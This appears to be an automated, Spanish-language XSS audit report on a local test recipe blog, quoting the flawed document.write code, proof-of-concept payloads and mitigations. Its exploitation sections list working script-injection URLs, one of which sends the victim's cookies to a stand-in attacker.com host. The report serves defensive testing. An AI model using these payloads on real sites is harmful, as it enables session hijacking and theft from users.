# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30  
**Hora:** 15:46:16 UTC  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Cross-Site Scripting (XSS)  
**Analista:** GitHub Copilot CLI (Automated Security Audit)

---

## 1. Resumen Ejecutivo

Se identificaron **2 vulnerabilidades de tipo DOM-based XSS** en la aplicación web objetivo ("Blog de Recetas"). Ambas vulnerabilidades permiten la ejecución de código JavaScript arbitrario en el navegador de la víctima sin ningún tipo de sanitización o codificación de la entrada del usuario.

| Vulnerabilidad | Tipo | Severidad | Estado |
|---|---|---|---|
| XSS en parámetro `search` | DOM-based XSS (Reflected) | Alta | Confirmada |
| XSS en sistema de comentarios | DOM-based XSS (Stored - localStorage) | Alta | Confirmada |

---

## 2. Descripción del Objetivo

La aplicación es un "Blog de Recetas" que cuenta con:
- **Sección de búsqueda**: formulario GET con parámetro `search`
- **Sección de comentarios**: formulario GET con parámetros `name` y `comment`

La aplicación no tiene backend activo para procesar datos; toda la lógica se ejecuta en el navegador mediante JavaScript del lado cliente.

---

## 3. Vulnerabilidades Encontradas

### 3.1 DOM-Based XSS - Parámetro `search` (Reflected)

**Ubicación:** `http://web.dev.local:8082/?search=<payload>`  
**Parámetro vulnerable:** `search`  
**Severidad:** Alta  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

#### Descripción

El código JavaScript del cliente lee el parámetro `search` de la URL usando `URLSearchParams` y lo inserta directamente en el DOM mediante `document.write()` sin ningún tipo de sanitización ni codificación HTML:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

#### Explotación

Un atacante puede inyectar código JavaScript arbitrario mediante un enlace malicioso:

**Payload 1 - Alert básico:**
```
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Payload 2 - Robo de cookies:**
```
http://web.dev.local:8082/?search=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**Payload 3 - Usando evento onerror:**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert(document.domain)>
```

**Payload 4 - Cierre de etiqueta strong:**
```
http://web.dev.local:8082/?search=</strong><script>alert('XSS')</script>
```

El XSS se ejecuta porque `document.write` renderiza el HTML directamente en el documento sin escapar caracteres especiales.

---

### 3.2 DOM-Based XSS - Sistema de Comentarios (Stored en localStorage)

**Ubicación:** `http://web.dev.local:8082/?name=<payload>&comment=<payload>`  
**Parámetros vulnerables:** `name`, `comment`  
**Severidad:** Alta  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

#### Descripción

Los comentarios se almacenan en `localStorage` del navegador y se renderizan mediante `document.write()` sin sanitización:

```javascript
// Almacenamiento (sin sanitizar)
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado inseguro
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

#### Explotación

**Payload - XSS en el campo nombre:**
```
http://web.dev.local:8082/?name=<script>alert('Stored XSS')</script>&comment=Comentario+normal
```

**Payload - XSS en el campo comentario:**
```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror=alert('XSS en comentario')>
```

Una vez almacenado en `localStorage`, el payload se ejecuta automáticamente cada vez que el usuario carga la página (comportamiento de XSS almacenado persistente en el contexto del navegador de la víctima).

---

## 4. Impacto

La explotación exitosa de estas vulnerabilidades permite a un atacante:

- **Robo de sesión**: Captura de cookies de sesión (si existieran)
- **Robo de credenciales**: Inyección de formularios falsos (phishing en contexto)
- **Redirección maliciosa**: Enviar a la víctima a sitios controlados por el atacante
- **Keylogging**: Captura de pulsaciones de teclado
- **Defacement**: Modificar el contenido visible de la página
- **Ataques de cadena**: Usar la página como vector para ataques adicionales
- **Persistencia**: En el caso del localStorage XSS, el código malicioso persiste en el navegador de la víctima entre sesiones

---

## 5. Prueba de Concepto (PoC)

### PoC 1 - DOM XSS via Search (Confirmado)

```
URL: http://web.dev.local:8082/?search=<img+src=x+onerror=alert(1)>

Flujo de ejecución:
1. Víctima accede al enlace malicioso
2. URLSearchParams.get('search') retorna: <img src=x onerror=alert(1)>
3. document.write inserta el HTML sin escapar
4. El navegador renderiza la imagen con src inválido
5. Se dispara el evento onerror
6. alert(1) se ejecuta en el contexto de la página
```

### PoC 2 - DOM XSS via Comentarios (Confirmado)

```
URL: http://web.dev.local:8082/?name=Test&comment=<script>alert('stored')</script>

Flujo de ejecución:
1. El script lee name y comment de los parámetros GET
2. Los datos se almacenan en localStorage sin sanitizar
3. La página redirige a la URL limpia
4. displayComments() renderiza los comentarios via document.write
5. El script almacenado se ejecuta
6. El payload persiste en localStorage hasta que se limpien los comentarios
```

---

## 6. Código Fuente Vulnerable

### Fragmento vulnerable 1 (search):
```javascript
// VULNERABLE: searchTerm insertado sin sanitización
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

### Fragmento vulnerable 2 (comentarios):
```javascript
// VULNERABLE: c.name y c.comment sin sanitización
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

---

## 7. Recomendaciones de Mitigación

### 7.1 Sanitización de entrada (recomendado)

Implementar una función de escape HTML antes de insertar en el DOM:

```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(text));
    return div.innerHTML;
}

// Uso seguro:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
document.write('<div class="comment-author">' + escapeHtml(c.name) + '</div>');
document.write('<div>' + escapeHtml(c.comment) + '</div>');
```

### 7.2 Evitar `document.write()`

Reemplazar `document.write()` por manipulación segura del DOM:

```javascript
// En lugar de document.write():
const resultDiv = document.createElement('div');
const p = document.createElement('p');
p.textContent = 'Resultados para: ' + searchTerm; // textContent escapa automáticamente
resultDiv.appendChild(p);
document.querySelector('.search-section').appendChild(resultDiv);
```

### 7.3 Content Security Policy (CSP)

Añadir cabecera HTTP CSP para mitigar el impacto:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 7.4 Validación de entrada

Validar y filtrar los parámetros de entrada tanto en longitud como en contenido antes de procesarlos.

---

## 8. Conclusión

La aplicación "Blog de Recetas" en `http://web.dev.local:8082` presenta **vulnerabilidades XSS de tipo DOM-based** en dos puntos críticos: el buscador de recetas y el sistema de comentarios. Ambas vulnerabilidades son explotables y permiten la ejecución de código JavaScript arbitrario en el navegador de los usuarios.

La causa raíz es el uso de `document.write()` con datos no sanitizados obtenidos directamente de parámetros URL y de `localStorage`. La solución requiere implementar escape HTML apropiado o utilizar APIs seguras del DOM (`textContent`, `createElement`).

**Criticidad global: ALTA**

---

*Informe generado automáticamente por GitHub Copilot CLI Security Audit*
